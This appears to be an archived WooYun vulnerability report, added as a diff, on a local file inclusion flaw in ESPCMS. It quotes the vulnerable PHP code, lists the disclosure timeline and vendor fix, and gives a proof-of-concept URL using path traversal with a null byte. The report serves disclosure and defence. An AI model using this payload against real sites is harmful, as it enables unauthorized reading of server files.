@@ -1,0 +1,233 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		ESPCMS Local File Inclusion Vulnerability  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		ESPCMS Local File Inclusion Vulnerability  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/knife">knife</a> 
+</li><li>提交时间：		2013-04-08 18:39</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-04-08：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-04-08：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-04-18：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-04-23：	厂商提前公开漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">包含</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">adminsoft/index.php<br />
+<br />
+</p><pre><code>$archive = indexget(&#039;archive&#039;, &#039;R&#039;);<br />
+$archive = empty($archive) ? &#039;adminuser&#039; : $archive;<br />
+$action = indexget(&#039;action&#039;, &#039;R&#039;);<br />
+$action = empty($action) ? &#039;login&#039; : $action;<br />
+<br />
+include admin_ROOT . adminfile . &quot;/control/$archive.php&quot;;// 包含产生 good nice<br />
+$control = new important();<br />
+$action = &#039;on&#039; . $action;<br />
+if (method_exists($control, $action)) {<br />
+$control-&gt;$action();<br />
+} else {<br />
+ exit(&#039;错误：系统方法错误！&#039;);<br />
+}</code></pre><p class='detail'><br />
+<br />
+</p><pre><code>首先看index.php<br />
+02	///省略无关代码<br />
+03	$archive = indexget(&#039;ac&#039;, &#039;R&#039;);  //ac<br />
+04	$action = indexget(&#039;at&#039;, &#039;R&#039;);    //at<br />
+05	///省略无关代码<br />
+06	if (empty($archive) || empty($action)) {<br />
+07	        include admin_ROOT . &#039;interface/public.php&#039;;<br />
+08	        $mainlist = new mainpage();<br />
+09	        if (method_exists($mainlist, &#039;in_index&#039;)) {<br />
+10	                $mainlist-&gt;in_index();<br />
+11	        } else {<br />
+12	                exit(&#039;Access error!&#039;);<br />
+13	        }<br />
+14	} else {<br />
+15	        if (in_array($archive, array(&#039;article&#039;, &#039;forum&#039;, &#039;search&#039;, &#039;bbssearch&#039;, &#039;forummain&#039;, &#039;messmain&#039;, &#039;special&#039;, &#039;respond&#039;, &#039;public&#039;, &#039;scriptout&#039;, &#039;enquiry&#039;, &#039;enquirymain&#039;, &#039;form&#039;, &#039;formmain&#039;, &#039;ordermain&#039;, &#039;membermain&#039;, &#039;member&#039;, &#039;forum&#039;, &#039;order&#039;))) { //强制，首页包含木有了<br />
+16	                $action = &#039;in_&#039; . $action; /in_$ 函数<br />
+17	                if (!file_exists(admin_ROOT . &quot;interface/$archive.php&quot;)) { //跟进<br />
+18	                        exit(&#039;Access error!&#039;);<br />
+19	                }<br />
+20	                include admin_ROOT . &quot;interface/$archive.php&quot;;<br />
+21	                $mainlist = new mainpage();<br />
+22	                if (method_exists($mainlist, $action)) {<br />
+23	                        $mainlist-&gt;$action();<br />
+24	                } else {<br />
+25	                        exit(&#039;Access error!&#039;);<br />
+26	                }<br />
+27	        } else {<br />
+28	                exit(&#039;Access error!&#039;);<br />
+29	        }<br />
+30	}<br />
+31	///省略无关代码<br />
+32	跟进到interface/enquity文件<br />
+33	///省略无关代码<br />
+34	$filename = $this-&gt;fun-&gt;accept(&#039;filename&#039;, &#039;G&#039;); //filename变量<br />
+35	                $filename = empty($filename) ? &#039;list&#039; : $filename;<br />
+36	///省略无关代码<br />
+37	$output = $this-&gt;pagetemplate-&gt;fetch($lng . &#039;/lib/&#039; . $filename);  &#039;<br />
+38	///省略无关代码<br />
+39	///跟进函数库查看<br />
+40	        function fetch($tpl_file, $cache_fileID = null, $outHTML = null) {<br />
+41	                if (!empty($outHTML)) {<br />
+42	                        $out = $this-&gt;gettemprequire($outHTML);<br />
+43	                        return $out;<br />
+44	                }<br />
+45	                require_once &#039;ectemplates_parser.php&#039;;<br />
+46	 <br />
+47	                if ($this-&gt;libfile) {<br />
+48	                        $tpl_file = $this-&gt;templatesDIR . $tpl_file . &#039;.html&#039;;  //html<br />
+49	                }<br />
+50	 <br />
+51	                $template_file = $this-&gt;tpl_dir . $tpl_file;<br />
+52	 <br />
+53	                $parsed_file = $this-&gt;tpl_c_dir . md5($tpl_file) . &#039;.php&#039;;<br />
+54	 <br />
+55	 <br />
+http://127.0.0.1/espcms_utf8_5.6.13.03.14_b/upload/index.php?ac=scriptout&amp;at=list&amp;tid=1&amp;filename=../../../../index.txt%00</code></pre><p class='detail'> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">http://127.0.0.1/espcms_utf8_5.6.13.03.14_b/upload/index.php?ac=scriptout&amp;at=list&amp;tid=1&amp;filename=../../../../index.txt%00 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">过滤特殊字符 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/knife" title="knife">knife</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-021408" title="ESPCMS Local File Inclusion Vulnerability">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2013-04-08 18:42</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢，我们会尽快修复！！！</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+																	<p class="detail">2013-04-23：已修正此漏洞！下载地址http://www.ecisp.cn/html/cn/download/</p>
+											
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="21408";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
